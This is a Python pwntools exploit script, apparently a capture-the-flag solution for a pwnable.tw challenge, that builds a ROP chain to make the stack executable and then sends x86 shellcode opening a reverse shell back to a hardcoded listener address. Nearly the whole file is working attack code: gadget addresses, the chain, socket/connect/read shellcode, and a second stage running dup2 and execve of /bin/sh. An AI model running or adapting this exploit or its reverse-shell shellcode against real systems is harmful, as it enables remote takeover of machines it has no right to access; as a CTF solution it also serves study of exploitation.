###reverse shell shellcoding

from pwn import *

###Listen param
laddr = '140.112.30.33'
lport = 10101

###Exploit
r = remote('chall.pwnable.tw',10303)
l = listen(lport)

###Useful addr
__stack_prot = 0x80e9fec
__libc_stack_end = 0x80e9fc8

###ROPgadget
_dl_make_stack_executable = 0x809a080
pop_eax = 0x80b8536     #pop eax ; ret
pop_ecx = 0x80583c9     #pop ecx ; ret
pop_ecx_val = 0x804b5eb #pop dword ptr [ecx] ; ret
call_esp = 0x80c99b0

###ROPchain
padding1 = b'a'*8+p32(0)

###Make stack executable
#  Requirements:
#    1. __stack_prot = 7
#    2. eax(arg1) = &__libc_stack_end
#    3. call _dl_make_stack_executable
ROPchain  = p32(pop_ecx)+p32(__stack_prot)
ROPchain += p32(pop_ecx_val)+p32(7)
ROPchain += p32(pop_eax)+p32(__libc_stack_end)
ROPchain += p32(_dl_make_stack_executable)

###call stack shellcode
ROPchain += p32(call_esp)

###Reverse shell part1(creat socket + connect + read further code)
###Create socket
sock = asm('''
            push 0x1
            pop ebx         #ebx  -> socketcall_arg1(call)  =1      =socket()
            xor edx,edx
            push edx        #     -> socket_arg3(protocol)  =0      =IPPROT_IP
            push ebx        #     -> socket_arg2(type)      =1      =SOCK_STREAM
            push 0x2        #     -> socket_arg1(domain)    =2      =AF_INET
            mov ecx, esp    #ecx  -> socketcall_arg2(*args) =esp
            push 0x66
            pop eax         #eax  -> syscall number         =0x66   =sys_socketcall
            int 0x80
            xchg edx, eax   #store sockfd in edx
            ''')

###Connect
conn = asm('''
            push 0x211e708c #     -> socketaddr_in[2](sin_addr)     =140.112.30.33
            pushw 0x7527    #     -> socketaddr_in[1](sin_port)     =10101
            inc ebx
            pushw bx        #     -> socketaddr_in[0](sin_family)   =2  =AF_INET
            mov ecx, esp
            push 0x10       #     -> connect_arg3(addrlen)  =0x10   =size(socketaddr_in)
            push ecx        #     -> connect_arg2(*addr)            =&socketaddr_in
            push edx        #     -> connect_arg1(sockfd)   =0
            inc ebx         #ebx  -> socketcall_arg1(call)  =3      =connect()
            mov ecx, esp    #ecx  -> socketcall_arg2(*args) =esp
            mov al, 0x66    #eax  -> syscall number         =0x66   =sys_socketcall
            int 0x80
            ''')

###Read further shell code
read = asm('''
            push 0x3
            pop eax         #eax  -> syscall number         =0x3    =sys_read
            push edx
            pop ebx         #ebx  -> read_arg1(fd)          =0      =sockfd
            /**/            #ecx  -> read_arg2(*buf)        already set to some esp
            push 0x100
            pop edx         #edx  -> read_arg3(count)       =0x100
            int 0x80
            ''')

payload1 = padding1+ROPchain+sock+conn+read
r.send(payload1)

###Reverse shell part2(dup2 + execve)
padding2 = b'\x90'*0x5b

###dup2
#  since stdin is closed prior creating sockfd, 0 stdin is already set to sockfd
#  only nead to dup fd to stdout
dup2 = asm('''
            mov al, 0x3f    #eax  -> syscall number         =0x3f   =dup2()
            /**/            #ebx  -> dup2_arg1(oldfd)       already set to sockfd
            push 0x1
            pop ecx         #ecx  -> dup2_arg2(newfd)       =0x1    =stdout_fd
            int 0x80
            ''')

###execve
Exec = asm('''
            push 0x0068732F
            push 0x6E69622F
            mov eax, 0xb
            mov ebx, esp
            xor ecx, ecx
            xor edx, edx
            xor esi, esi
            int 0x80
            ''')

payload2 = padding2+dup2+Exec
l.send(payload2)
l.interactive()


###Reference
#  _dl_make_stack_executable() source
#    https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/dl-execstack.c.html#_dl_make_stack_executable
#  reverse shell
#    https://www.rcesecurity.com/2014/07/slae-shell-reverse-tcp-shellcode-linux-x86/
#  linux x86 syscall num
#    https://syscalls.kernelgrok.com/
#  socketcall man
#    http://man7.org/linux/man-pages/man2/socketcall.2.html
#  socket man
#    http://man7.org/linux/man-pages/man2/socket.2.html
#  connect man
#    http://man7.org/linux/man-pages/man2/connect.2.html
